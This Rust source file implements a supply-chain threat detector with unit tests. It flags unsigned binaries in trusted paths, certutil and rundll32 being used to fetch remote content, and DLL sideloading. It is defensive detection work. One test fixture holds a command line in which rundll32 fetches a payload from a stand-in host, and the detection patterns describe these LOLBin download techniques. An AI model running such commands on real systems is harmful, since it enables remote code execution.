use crate::detector::{
    DetectionFinding, DetectionStrategy, FilePersistenceEvent, ProcessStartEvent, TelemetryEvent,
    TelemetryPayload,
};
use crate::{ProfileValidationError, validate_confidence_thresholds};
use serde::{Deserialize, Serialize};
use serde_json::json;
use swarm_core::pheromone::ThreatClass;
use swarm_core::types::Severity;

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct SupplyChainProfile {
    #[serde(default = "default_trusted_paths")]
    pub trusted_paths: Vec<String>,
    #[serde(default = "default_trusted_signers")]
    pub trusted_signers: Vec<String>,
    #[serde(default = "default_suspicious_loader_pairs")]
    pub suspicious_loader_pairs: Vec<(String, String)>,
    #[serde(default = "default_high_confidence_threshold")]
    pub high_confidence_threshold: f64,
    #[serde(default = "default_medium_confidence_threshold")]
    pub medium_confidence_threshold: f64,
}

impl Default for SupplyChainProfile {
    fn default() -> Self {
        Self {
            trusted_paths: default_trusted_paths(),
            trusted_signers: default_trusted_signers(),
            suspicious_loader_pairs: default_suspicious_loader_pairs(),
            high_confidence_threshold: default_high_confidence_threshold(),
            medium_confidence_threshold: default_medium_confidence_threshold(),
        }
    }
}

#[derive(Debug, Clone)]
pub struct SupplyChainDetector {
    trusted_paths: Vec<String>,
    trusted_signers: Vec<String>,
    suspicious_loader_pairs: Vec<(String, String)>,
    high_confidence_threshold: f64,
    medium_confidence_threshold: f64,
}

impl Default for SupplyChainDetector {
    fn default() -> Self {
        Self {
            trusted_paths: default_trusted_paths()
                .into_iter()
                .map(|value| normalize_path(&value))
                .collect(),
            trusted_signers: default_trusted_signers()
                .into_iter()
                .map(|value| value.to_ascii_lowercase())
                .collect(),
            suspicious_loader_pairs: default_suspicious_loader_pairs()
                .into_iter()
                .map(|(loader, expected_dir)| {
                    (
                        normalize_process_name(&loader),
                        normalize_path(&expected_dir),
                    )
                })
                .collect(),
            high_confidence_threshold: default_high_confidence_threshold(),
            medium_confidence_threshold: default_medium_confidence_threshold(),
        }
    }
}

impl SupplyChainDetector {
    pub fn from_profile(profile: SupplyChainProfile) -> Result<Self, ProfileValidationError> {
        profile.validate()?;
        Ok(Self {
            trusted_paths: profile
                .trusted_paths
                .into_iter()
                .map(|value| normalize_path(&value))
                .collect(),
            trusted_signers: profile
                .trusted_signers
                .into_iter()
                .map(|value| value.to_ascii_lowercase())
                .collect(),
            suspicious_loader_pairs: profile
                .suspicious_loader_pairs
                .into_iter()
                .map(|(loader, expected_dir)| {
                    (
                        normalize_process_name(&loader),
                        normalize_path(&expected_dir),
                    )
                })
                .collect(),
            high_confidence_threshold: profile.high_confidence_threshold,
            medium_confidence_threshold: profile.medium_confidence_threshold,
        })
    }

    pub fn profile(&self) -> SupplyChainProfile {
        SupplyChainProfile {
            trusted_paths: self.trusted_paths.clone(),
            trusted_signers: self.trusted_signers.clone(),
            suspicious_loader_pairs: self.suspicious_loader_pairs.clone(),
            high_confidence_threshold: self.high_confidence_threshold,
            medium_confidence_threshold: self.medium_confidence_threshold,
        }
    }

    fn evaluate_process(
        &self,
        event: &TelemetryEvent,
        process: &ProcessStartEvent,
    ) -> Option<DetectionFinding> {
        let normalized_name = normalize_process_name(&process.process_name);
        let command_line = process.command_line.to_ascii_lowercase();
        let executable_path = process
            .executable_path
            .as_deref()
            .map(normalize_path)
            .unwrap_or_else(|| normalize_path(&process.process_name));
        let signer = process
            .signer
            .as_deref()
            .unwrap_or_default()
            .to_ascii_lowercase();
        let trusted_path = self
            .trusted_paths
            .iter()
            .any(|path| executable_path.starts_with(path));
        let signer_trusted = !signer.is_empty()
            && self
                .trusted_signers
                .iter()
                .any(|candidate| signer.contains(candidate));

        if trusted_path && matches!(process.signature_valid, Some(false)) && !signer_trusted {
            return Some(DetectionFinding {
                finding_id: format!("{}:{}", self.id(), event.event_id),
                event_id: event.event_id.clone(),
                threat_class: ThreatClass::SupplyChain,
                severity: Severity::Critical,
                confidence: self.high_confidence_threshold,
                evidence: json!({
                    "mitre_technique_id": "T1553.002",
                    "process_name": process.process_name,
                    "parent_process": process.parent_process,
                    "command_line": process.command_line,
                    "executable_path": process.executable_path,
                    "signer": process.signer,
                    "signature_valid": process.signature_valid,
                    "mode": "unsigned_trusted_path_execution",
                }),
                strategy_id: self.id().to_string(),
            });
        }

        if normalized_name == "certutil"
            && command_line.contains("-urlcache")
            && (command_line.contains("http://") || command_line.contains("https://"))
        {
            return Some(DetectionFinding {
                finding_id: format!("{}:{}", self.id(), event.event_id),
                event_id: event.event_id.clone(),
                threat_class: ThreatClass::SupplyChain,
                severity: Severity::High,
                confidence: self.high_confidence_threshold,
                evidence: json!({
                    "mitre_technique_id": "T1218",
                    "process_name": process.process_name,
                    "command_line": process.command_line,
                    "mode": "signed_binary_abuse",
                    "lolbin": "certutil",
                }),
                strategy_id: self.id().to_string(),
            });
        }

        if normalized_name == "rundll32"
            && (command_line.contains("javascript:")
                || command_line.contains("http://")
                || command_line.contains("https://"))
        {
            return Some(DetectionFinding {
                finding_id: format!("{}:{}", self.id(), event.event_id),
                event_id: event.event_id.clone(),
                threat_class: ThreatClass::SupplyChain,
                severity: Severity::Critical,
                confidence: self.high_confidence_threshold,
                evidence: json!({
                    "mitre_technique_id": "T1218.011",
                    "process_name": process.process_name,
                    "command_line": process.command_line,
                    "mode": "signed_binary_abuse",
                    "lolbin": "rundll32",
                }),
                strategy_id: self.id().to_string(),
            });
        }

        None
    }

    fn evaluate_file(
        &self,
        event: &TelemetryEvent,
        file: &FilePersistenceEvent,
    ) -> Option<DetectionFinding> {
        let process_name = normalize_process_name(&file.process_name);
        let file_path = normalize_path(&file.file_path);
        let operation = file.operation.to_ascii_lowercase();
        let looks_like_library = file_path.ends_with(".dll")
            || file_path.ends_with(".so")
            || file_path.ends_with(".dylib");
        let loadish_operation = matches!(
            operation.as_str(),
            "load" | "write" | "create" | "drop" | "install"
        );
        if !looks_like_library || !loadish_operation {
            return None;
        }

        let (_, expected_dir) = self
            .suspicious_loader_pairs
            .iter()
            .find(|(loader, _)| loader == &process_name)?;

        if file_path.starts_with(expected_dir) {
            return None;
        }

        Some(DetectionFinding {
            finding_id: format!("{}:{}", self.id(), event.event_id),
            event_id: event.event_id.clone(),
            threat_class: ThreatClass::SupplyChain,
            severity: Severity::Critical,
            confidence: self.high_confidence_threshold,
            evidence: json!({
                "mitre_technique_id": "T1574.001",
                "file_path": file.file_path,
                "operation": file.operation,
                "process_name": file.process_name,
                "content_preview": file.content_preview,
                "mode": "dll_sideloading",
                "expected_directory": expected_dir,
            }),
            strategy_id: self.id().to_string(),
        })
    }
}

impl SupplyChainProfile {
    pub fn validate(&self) -> Result<(), ProfileValidationError> {
        validate_confidence_thresholds(
            "SupplyChainProfile",
            self.high_confidence_threshold,
            self.medium_confidence_threshold,
        )?;
        validate_non_empty("SupplyChainProfile", "trusted_paths", &self.trusted_paths)?;
        if self.suspicious_loader_pairs.is_empty() {
            return Err(ProfileValidationError {
                profile: "SupplyChainProfile",
                field: "suspicious_loader_pairs",
                reason: "must contain at least one loader pair".to_string(),
            });
        }
        Ok(())
    }
}

impl DetectionStrategy for SupplyChainDetector {
    fn as_any(&self) -> &dyn std::any::Any {
        self
    }

    fn id(&self) -> &str {
        "supply_chain"
    }

    fn evaluate(&self, event: &TelemetryEvent) -> Vec<DetectionFinding> {
        match &event.payload {
            TelemetryPayload::ProcessStart(process) => {
                self.evaluate_process(event, process).into_iter().collect()
            }
            TelemetryPayload::FilePersistence(file) => {
                self.evaluate_file(event, file).into_iter().collect()
            }
            TelemetryPayload::NetworkConnect(_)
            | TelemetryPayload::ProcessMemoryAccess(_)
            | TelemetryPayload::DnsQuery(_)
            | TelemetryPayload::RegistryAccess(_)
            | TelemetryPayload::RegistryPersistence(_)
            | TelemetryPayload::AuthenticationEvent(_)
            | TelemetryPayload::InfrastructureHealth(_)
            | TelemetryPayload::ThermalAnomaly(_)
            | TelemetryPayload::ResourceExhaustion(_) => Vec::new(),
        }
    }
}

fn validate_non_empty(
    profile: &'static str,
    field: &'static str,
    values: &[String],
) -> Result<(), ProfileValidationError> {
    if values.iter().all(|value| value.trim().is_empty()) {
        return Err(ProfileValidationError {
            profile,
            field,
            reason: "must contain at least one non-empty value".to_string(),
        });
    }
    Ok(())
}

fn normalize_path(value: &str) -> String {
    value.trim().replace('\\', "/").to_ascii_lowercase()
}

fn normalize_process_name(value: &str) -> String {
    let basename = value
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(value)
        .trim()
        .to_ascii_lowercase();
    basename
        .strip_suffix(".exe")
        .unwrap_or(&basename)
        .to_string()
}

fn default_trusted_paths() -> Vec<String> {
    [
        "c:/windows/system32",
        "c:/program files",
        "/usr/bin",
        "/usr/local/bin",
    ]
    .into_iter()
    .map(str::to_string)
    .collect()
}

fn default_trusted_signers() -> Vec<String> {
    ["microsoft", "apple", "red hat", "canonical"]
        .into_iter()
        .map(str::to_string)
        .collect()
}

fn default_suspicious_loader_pairs() -> Vec<(String, String)> {
    vec![
        ("rundll32".to_string(), "c:/windows/system32".to_string()),
        ("svchost".to_string(), "c:/windows/system32".to_string()),
        ("python".to_string(), "/usr/lib".to_string()),
    ]
}

fn default_high_confidence_threshold() -> f64 {
    0.9
}

fn default_medium_confidence_threshold() -> f64 {
    0.7
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::{SupplyChainDetector, SupplyChainProfile};
    use crate::detector::{
        DetectionStrategy, FilePersistenceEvent, ProcessStartEvent, TelemetryEvent,
        TelemetryPayload,
    };
    use swarm_core::pheromone::ThreatClass;
    use swarm_core::types::Severity;

    #[test]
    fn unsigned_trusted_path_binary_triggers_supply_chain_finding() {
        let detector = SupplyChainDetector::default();
        let event = TelemetryEvent {
            source: "synthetic".to_string(),
            event_id: "evt-supply-1".to_string(),
            timestamp: 1_700_000_000,
            host_id: Some("host-1".to_string()),
            payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
                parent_process: "services.exe".to_string(),
                process_name: "svchost.exe".to_string(),
                command_line: "svchost.exe -k netsvcs".to_string(),
                user: Some("SYSTEM".to_string()),
                executable_path: Some("C:\\Windows\\System32\\svchost.exe".to_string()),
                signer: Some("Unknown Publisher".to_string()),
                signature_valid: Some(false),
            }),
        };

        let findings = detector.evaluate(&event);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].threat_class, ThreatClass::SupplyChain);
        assert_eq!(findings[0].severity, Severity::Critical);
        assert_eq!(
            findings[0].evidence["mitre_technique_id"].as_str(),
            Some("T1553.002")
        );
    }

    #[test]
    fn dll_sideloading_path_triggers_supply_chain_finding() {
        let detector = SupplyChainDetector::default();
        let event = TelemetryEvent {
            source: "synthetic".to_string(),
            event_id: "evt-supply-2".to_string(),
            timestamp: 1_700_000_000,
            host_id: Some("host-1".to_string()),
            payload: TelemetryPayload::FilePersistence(FilePersistenceEvent {
                file_path: "C:\\Users\\Public\\version.dll".to_string(),
                operation: "load".to_string(),
                process_name: "rundll32.exe".to_string(),
                content_preview: Some("export Start".to_string()),
            }),
        };

        let findings = detector.evaluate(&event);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].threat_class, ThreatClass::SupplyChain);
        assert_eq!(
            findings[0].evidence["mitre_technique_id"].as_str(),
            Some("T1574.001")
        );
    }

    #[test]
    fn signed_binary_abuse_triggers_supply_chain_finding() {
        let detector = SupplyChainDetector::default();
        let event = TelemetryEvent {
            source: "synthetic".to_string(),
            event_id: "evt-supply-3".to_string(),
            timestamp: 1_700_000_000,
            host_id: Some("host-1".to_string()),
            payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
                parent_process: "cmd.exe".to_string(),
                process_name: "rundll32.exe".to_string(),
                command_line: "rundll32.exe javascript:https://bad.example/payload".to_string(),
                user: Some("alice".to_string()),
                executable_path: Some("C:\\Windows\\System32\\rundll32.exe".to_string()),
                signer: Some("Microsoft Windows".to_string()),
                signature_valid: Some(true),
            }),
        };

        let findings = detector.evaluate(&event);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].threat_class, ThreatClass::SupplyChain);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn invalid_profile_is_rejected() {
        let error = SupplyChainProfile {
            suspicious_loader_pairs: Vec::new(),
            ..SupplyChainProfile::default()
        }
        .validate()
        .expect_err("empty loader pairs should fail");
        assert_eq!(error.field, "suspicious_loader_pairs");
    }
}
